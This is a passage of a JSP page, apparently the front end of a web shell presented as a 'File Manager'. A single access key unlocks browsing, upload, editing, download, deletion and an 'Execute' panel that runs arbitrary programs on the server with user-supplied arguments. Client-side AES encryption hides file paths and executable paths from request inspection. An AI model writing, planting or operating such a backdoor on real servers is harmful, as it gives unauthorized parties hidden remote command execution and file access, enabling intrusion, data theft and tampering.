  <input type="hidden" name="hFilename"     id="hFilename"   />
  <input type="hidden" name="hExePath"      id="hExePath"    />
  <input type="hidden" name="hDownloadPath" id="hDlPath"     />
  <input type="hidden" name="hExePathPlain" id="hExePathPlain"/>
  <input type="hidden" name="hFilenamePlain" id="hFnPlain"   />
  <input type="hidden" name="hContentPlain" id="hConPlain"   />
  <% if (isAuth) { %>
  <input type="hidden" name="__ACTION"      id="hAction"     />
  <% } %>

  <% if (!isAuth) { %>
  <!-- LOGIN -->
  <!-- Dedicated hidden field so the login submit doesn't depend on JS -->
  <input type="hidden" name="__ACTION" value="login"/>
  <div class="login-wrap">
    <div class="login-box">
      <div class="login-title">&#128193; File Manager</div>
      <div class="login-sub">Enter your access key to continue</div>
      <div class="login-field">
        <label>Access Key</label>
        <input type="password" name="userKey" placeholder="••••••••" autocomplete="off"/>
      </div>
      <% if (showMsg && "err".equals(msgKind)) { %>
        <div class="login-err"><%= htmlEncode(msgText) %></div>
      <% } %>
      <button type="submit" class="btn-login">Unlock</button>
    </div>
  </div>
  <% } else { %>

  <!-- APP -->
  <!-- Topbar -->
  <div class="topbar">
    <span class="topbar-logo">&#128193; File Manager</span>
    <span class="topbar-path"><%= htmlEncode(finalCwd) %></span>
    <% if (showMsg) { %>
      <span class="topbar-msg msg-<%= msgKind %>"><%= htmlEncode(msgText) %></span>
    <% } %>
    <button type="button" class="btn-logout" onclick="_clearHidden();_setAction('logout');document.getElementById('fm').submit();">Lock</button>
  </div>

  <div class="layout">

    <!-- SIDEBAR -->
    <div class="sidebar" id="sidebar">

      <div class="sidebar-nav">
        <button type="button" class="btn btn-ghost btn-sm" onclick="_clearHidden();_setAction('up');document.getElementById('fm').submit();">Up</button>
        <button type="button" class="btn btn-primary btn-sm" onclick="_clearHidden();_setAction('new');document.getElementById('fm').submit();">New File</button>
      </div>

      <div class="sidebar-search">
        <input type="text" id="filterInput" placeholder="Filter files..." oninput="FM.filter(this.value)" autocomplete="off"/>
      </div>

      <div class="sidebar-upload">
        <form id="fmUpload" method="post" enctype="multipart/form-data" action="<%= request.getRequestURI() %>" style="display:contents">
          <input type="hidden" name="__ACTION" value="upload"/>
          <input type="file" name="uploadFile" class="upload-input"/>
          <button type="submit" class="btn btn-ghost btn-sm">Upload</button>
        </form>
      </div>

      <div class="sidebar-list" id="sidebarList">
        <%= listing.toString() %>
      </div>

      <div class="cd-row">
        <input type="text" id="visPath" placeholder="Go to path..." autocomplete="off"
               onkeydown="if(event.key==='Enter') FM.go();"/>
        <button type="button" class="btn btn-ghost btn-sm" onclick="return FM.prepGo();">Go</button>
      </div>
    </div>

    <div class="resize-handle" id="resizeHandle"></div>

    <!-- MAIN PANEL -->
    <div class="main">

      <div class="panel-tabs">
        <button type="button" class="tab" id="tabWelcome" onclick="FM.showPanel('welcome')">Browse</button>
        <button type="button" class="tab" id="tabEditor"  onclick="FM.showPanel('editor')"  style="display:none">
          <span id="tabEditorName">Editor</span>
          <span class="tab-x" onclick="FM.closeTab('editor',event)">x</span>
        </button>
        <button type="button" class="tab" id="tabExec" onclick="FM.showPanel('exec')" style="display:none">
          <span id="tabExecName">Execute</span>
          <span class="tab-x" onclick="FM.closeTab('exec',event)">x</span>
        </button>
      </div>

      <!-- Welcome -->
      <div id="panelWelcome" class="panel-body">
        <div class="panel-welcome">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
          </svg>
          <p>Select a file from the sidebar to open it.</p>
          <p style="font-size:11px;color:var(--dim)">Hover a row to see Read / DL / Run buttons.</p>
        </div>
      </div>

      <!-- Editor -->
      <div id="panelEditor" class="panel-body panel-hidden">
        <div class="editor-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">File:</span>
          <input type="text" id="visFilename" placeholder="filename.txt" value="<%= htmlEncode(finalOpenFile) %>"/>
        </div>
        <textarea id="TxtContent" class="editor"><%= htmlEncode(finalEditorContent) %></textarea>
        <div class="editor-actions">
          <button type="button" class="btn btn-success" onclick="return FM.prepSave();">Save</button>
          <button type="button" class="btn btn-danger"  onclick="_clearHidden();_setAction('cancelEdit');document.getElementById('fm').submit();">Close</button>
        </div>
      </div>

      <!-- Execute -->
      <div id="panelExec" class="panel-body panel-hidden">
        <div class="exec-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap">Exe:</span>
          <input type="text" id="visExePath" class="exec-path" readonly value="<%= htmlEncode(finalRunExe) %>"/>
        </div>
        <div class="exec-args-row">
          <label>Args:</label>
          <input type="text" id="TxtExeArgs" name="exeArgs" placeholder="optional arguments..." value="<%= htmlEncode(finalExeArgs) %>"/>
        </div>
        <textarea class="console" style="display:none" aria-hidden="true"></textarea>
        <% if (finalShowExec) { %>
          <pre class="console" id="execResultPre" style="overflow-y:auto; max-height:420px; white-space:pre-wrap; word-break:break-all;"><%= htmlEncode(finalExecOutput) %></pre>
        <% } %>
        <div class="exec-actions">
          <button type="button" class="btn btn-run" onclick="return FM.prepExec();">Run</button>
          <button type="button" class="btn btn-danger" onclick="_clearHidden();_setAction('cancelExec');document.getElementById('fm').submit();">Close</button>
        </div>
      </div>

    </div><!-- /main -->
  </div><!-- /layout -->
  <% } %>

<script>
// ============================================================
// FM — File Manager client namespace
// ============================================================
var FM = (function() {

  // ── AES-256-CBC (pure JS, works on plain HTTP) ──────────────
  var _key = null;

  function _initAes(hexKey) {
    if (!hexKey) return;
    _key = new Uint8Array(hexKey.length / 2);
    for (var i = 0; i < hexKey.length; i += 2)
      _key[i/2] = parseInt(hexKey.substr(i, 2), 16);
    _buildTables();
  }

  var _sb=[],_m2=[],_m3=[],_rcon=[];
  function _buildTables() {
    var p=1,q=1;
    do {
      p=p^(p<<1)^(p&0x80?0x1B:0); p&=0xFF;
      q^=q<<1; q^=q<<2; q^=q<<4; q^=(q&0x80?0x09:0); q&=0xFF;
      _sb[p]=((q^((q<<1)|(q>>7))^((q<<2)|(q>>6))^((q<<3)|(q>>5))^((q<<4)|(q>>4)))^0x63)&0xFF;
    } while(p!==1);
    _sb[0]=0x63;
    for(var i=0;i<256;i++){ _m2[i]=i<128?(i<<1)&0xFF:((i<<1)^0x1B)&0xFF; _m3[i]=(_m2[i]^i)&0xFF; }
    var c=1; for(var r=0;r<10;r++){ _rcon[r]=c; c=_m2[c]; }
  }

  function _expandKey(k) {
    var nk=8,nr=14,w=[];
    for(var i=0;i<nk;i++) w[i]=[k[4*i],k[4*i+1],k[4*i+2],k[4*i+3]];
    for(var i=nk;i<4*(nr+1);i++){
      var t=w[i-1].slice();
      if(i%nk===0) t=[_sb[t[1]]^_rcon[i/nk-1],_sb[t[2]],_sb[t[3]],_sb[t[0]]];
      else if(nk>6&&i%nk===4) t=t.map(function(x){return _sb[x];});
      w[i]=[w[i-nk][0]^t[0],w[i-nk][1]^t[1],w[i-nk][2]^t[2],w[i-nk][3]^t[3]];
    }
    var rk=[];
    for(var i=0;i<=nr;i++) rk[i]=w.slice(4*i,4*i+4);
    return rk;
  }

  function _aesBlock(b, rk) {
    var s=[[],[],[],[]];
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]=b[4*c+r];
    var ark=function(k){for(var c=0;c<4;c++) for(var r=0;r<4;r++) s[r][c]^=k[c][r];};
    var sub=function(){for(var r=0;r<4;r++) for(var c=0;c<4;c++) s[r][c]=_sb[s[r][c]];};
    var shr=function(){for(var r=1;r<4;r++) for(var i=0;i<r;i++){var t=s[r][0];s[r][0]=s[r][1];s[r][1]=s[r][2];s[r][2]=s[r][3];s[r][3]=t;}};
    var mix=function(){for(var c=0;c<4;c++){var a=s[0][c],b=s[1][c],d=s[2][c],e=s[3][c];s[0][c]=_m2[a]^_m3[b]^d^e;s[1][c]=a^_m2[b]^_m3[d]^e;s[2][c]=a^b^_m2[d]^_m3[e];s[3][c]=_m3[a]^b^d^_m2[e];}};
    ark(rk[0]);
    for(var rd=1;rd<=13;rd++){sub();shr();mix();ark(rk[rd]);}
    sub();shr();ark(rk[14]);
    var o=new Uint8Array(16);
    for(var c=0;c<4;c++) for(var r=0;r<4;r++) o[4*c+r]=s[r][c];
    return o;
  }

  function _utf8(str) {
    var out=[];
    for(var i=0;i<str.length;i++){
      var c=str.charCodeAt(i);
      if(c<0x80) out.push(c);
      else if(c<0x800){ out.push(0xC0|(c>>6)); out.push(0x80|(c&0x3F)); }
      else { out.push(0xE0|(c>>12)); out.push(0x80|((c>>6)&0x3F)); out.push(0x80|(c&0x3F)); }
    }
    return new Uint8Array(out);
  }

  function _aesEncrypt(plainText) {
    if (!_key || !plainText) return '';
    var rk=_expandKey(_key), iv=new Uint8Array(16);
    for(var i=0;i<16;i++) iv[i]=Math.floor(Math.random()*256);
    var tb=_utf8(plainText), pad=16-(tb.length%16);
    var buf=new Uint8Array(tb.length+pad); buf.set(tb);
    for(var i=tb.length;i<buf.length;i++) buf[i]=pad;
    var out=new Uint8Array(16+buf.length); out.set(iv,0);
    var prev=iv;
    for(var i=0;i<buf.length;i+=16){
      var blk=new Uint8Array(16);
      for(var j=0;j<16;j++) blk[j]=buf[i+j]^prev[j];
      var enc=_aesBlock(blk,rk); out.set(enc,16+i); prev=enc;
    }
    return btoa(String.fromCharCode.apply(null,out))
      .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  }

  function _b64(str) {
    try { return btoa(unescape(encodeURIComponent(str))); }
    catch(e) { return btoa(str); }
  }

  function _hid(name)      { return document.querySelector('[name="'+name+'"]'); }
  function _set(name, val) { var h=_hid(name); if(h) h.value=val||''; }
  function _get(id)        { var el=document.getElementById(id); return el?el.value:''; }

  function showPanel(name) {
    ['welcome','editor','exec'].forEach(function(p){
      var panel = document.getElementById('panel'+p.charAt(0).toUpperCase()+p.slice(1));
      var tab   = document.getElementById('tab'  +p.charAt(0).toUpperCase()+p.slice(1));
      if (panel) panel.classList.toggle('panel-hidden', p!==name);
      if (tab)   tab.classList.toggle('active', p===name);
    });
  }

  function closeTab(name, e) {
    if (e) e.stopPropagation();
    _clearHidden();
    _setAction(name==='editor' ? 'cancelEdit' : 'cancelExec');
    document.getElementById('fm').submit();
  }

  function prepGo() {
    _clearHidden();
    _set('hPath', _aesEncrypt(_get('visPath')));
    _setAction('go');
    document.getElementById('fm').submit();
    return false;
  }

  function prepSave() {
    _set('hFilenamePlain', _get('visFilename'));
    var ta = document.getElementById('TxtContent');
    _set('hContentPlain', ta ? _b64(ta.value) : '');
    ta.value = '';
    _setAction('write');
    document.getElementById('fm').submit();
    return false;
  }

  function prepExec() {
    _clearHidden();
    var path = _get('visExePath');
    _set('hExePath',      _aesEncrypt(path));
    _set('hExePathPlain', path);
    _setAction('exec');
    document.getElementById('fm').submit();
    return false;
  }

  function filter(q) {
    q = q.toLowerCase();
    document.querySelectorAll('#sidebarList .entry').forEach(function(el){
      var nm = el.querySelector('.entry-name');
      el.style.display = (!q || (nm && nm.textContent.toLowerCase().includes(q))) ? '' : 'none';
    });
  }

  function go() {
    _set('hPath', _aesEncrypt(_get('visPath')));
    _setAction('go');
    document.getElementById('fm').submit();
  }

  function _initResize() {
    var handle = document.getElementById('resizeHandle');
    var sidebar = document.getElementById('sidebar');
    if (!handle || !sidebar) return;
    var dragging=false, startX, startW;
    handle.addEventListener('mousedown', function(e){
      dragging=true; startX=e.clientX; startW=sidebar.offsetWidth;
      handle.classList.add('dragging');
      document.body.style.cssText += ';cursor:col-resize;user-select:none';
    });
    document.addEventListener('mousemove', function(e){
      if (!dragging) return;
      var w=Math.min(500,Math.max(160,startW+(e.clientX-startX)));
      sidebar.style.width=sidebar.style.minWidth=sidebar.style.maxWidth=w+'px';
    });
    document.addEventListener('mouseup', function(){
      if (!dragging) return; dragging=false;
      handle.classList.remove('dragging');
      document.body.style.cursor=document.body.style.userSelect='';
    });
  }

  function _init() {
    _initAes('<%= authSKey %>');
    _initResize();

    var active     = '<%= finalPanel %>';
    var editorFile = '<%= jsStr(finalOpenFile) %>';
    var execFile   = '<%= jsStr(finalRunExe) %>';
    var isNew      = '<%= "1".equals(finalNewFile) ? "True" : "False" %>' === 'True';

    if (editorFile || isNew) {
      var tab = document.getElementById('tabEditor');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabEditorName');
      if (lbl) lbl.textContent = editorFile ? editorFile.split(/[\\/]/).pop() || 'Editor' : 'New File';
    }
    if (execFile || active==='exec') {
      var tab = document.getElementById('tabExec');
      if (tab) tab.style.display = '';
      var lbl = document.getElementById('tabExecName');
      if (lbl) lbl.textContent = execFile ? (execFile.split(/[\\/]/).pop() || 'Execute') : 'Execute';
      var ve  = document.getElementById('visExePath');
      var hep = document.getElementById('hExePathPlain');
      if (ve && execFile)  ve.value  = execFile;
      if (hep && execFile) hep.value = execFile;
    }

    if      (active==='editor' && (editorFile||isNew)) showPanel('editor');
    else if (active==='exec')                           showPanel('exec');
    else                                                showPanel('welcome');
  }

  window.addEventListener('load', _init);

  return { showPanel:showPanel, closeTab:closeTab, filter:filter, go:go,
           prepGo:prepGo, prepSave:prepSave, prepExec:prepExec };

})();

function _setAction(v) { var h=document.querySelector('[name="__ACTION"]'); if(h) h.value=v||''; }
function _clearEditor() { var ta=document.getElementById('TxtContent'); if(ta) ta.value=''; }
function _clearHidden() {
  _clearEditor();
  ['__CDDIR','__RDFILE','__RUNEXE','__DELFILE','hPath','hFilename','hExePath',
   'hDownloadPath','hExePathPlain','hFilenamePlain','hContentPlain'].forEach(function(n){
    var h=document.querySelector('[name="'+n+'"]'); if(h) h.value='';
  });
}
function cdDir(e)        { _clearHidden(); var h=document.querySelector('[name="__CDDIR"]');  if(h) h.value=e; document.getElementById('fm').submit(); }
function readFile(e)     { _clearHidden(); var h=document.querySelector('[name="__RDFILE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function runExe(e)       { _clearHidden(); var h=document.querySelector('[name="__RUNEXE"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function downloadFile(e) { _clearHidden(); var h=document.querySelector('[name="hDownloadPath"]'); if(h) h.value=e; document.getElementById('fm').submit(); }
function deleteFile(e, name) {
  if (!confirm('Delete "' + name + '"?\n\nThis cannot be undone.')) return;
  _clearHidden();
  var h=document.querySelector('[name="__DELFILE"]'); if(h) h.value=e;
  document.getElementById('fm').submit();
}
</script>

</form>
</body>
</html>
